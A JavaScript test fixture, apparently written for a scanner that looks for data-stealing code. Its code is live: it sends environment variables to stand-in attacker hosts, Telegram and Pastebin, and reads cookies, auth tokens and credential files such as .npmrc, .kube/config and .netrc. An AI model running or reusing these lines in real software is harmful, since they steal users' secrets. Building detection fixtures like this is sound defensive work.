/**
 * DATA STEALER TEST FILE - FOR SECURITY TESTING ONLY
 * This file contains data exfiltration patterns that should be detected
 * DO NOT USE IN PRODUCTION - THIS IS A TEST SAMPLE
 */

const fs = require('fs');
const https = require('https');
const axios = require('axios');

// Pattern: Steal and send environment variables
const envData = JSON.stringify(process.env);
axios.post('https://collector.evil.net/env', { data: envData });

// Pattern: Telegram bot exfiltration
fetch('https://api.telegram.org/bot123456:ABC-DEF/sendMessage', {
  method: 'POST',
  body: JSON.stringify({
    chat_id: '123456',
    text: JSON.stringify(process.env)
  })
});

// Pattern: Base64 encode env and send
const encoded = btoa(JSON.stringify(process.env));
fetch(`https://evil.com/collect?d=${encoded}`);

// Pattern: localStorage credential theft (browser context)
const token = localStorage.getItem('auth_token');
const session = localStorage.getItem('session_jwt');

// Pattern: Cookie theft
const cookies = document.cookie;
fetch('https://stealer.com/cookies', { 
  method: 'POST', 
  body: cookies 
});

// Pattern: .npmrc token theft
const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf-8');
const authTokenMatch = npmrc.match(/_authToken=(.+)/);

// Pattern: Docker config theft
const dockerConfig = fs.readFileSync(process.env.HOME + '/.docker/config.json', 'utf-8');

// Pattern: Kubernetes config theft
const kubeConfig = fs.readFileSync(process.env.HOME + '/.kube/config', 'utf-8');

// Pattern: pgpass theft
const pgpass = fs.readFileSync(process.env.HOME + '/.pgpass', 'utf-8');

// Pattern: netrc theft
const netrc = fs.readFileSync(process.env.HOME + '/.netrc', 'utf-8');

// Pattern: Ngrok tunnel for exfiltration
const exfilEndpoint = 'https://abc123.ngrok.io/receive';

// Pattern: Pastebin upload
fetch('https://pastebin.com/api/api_post.php', {
  method: 'POST',
  body: 'api_paste_code=' + encodeURIComponent(envData)
});

module.exports = { steal: function() { return true; } };
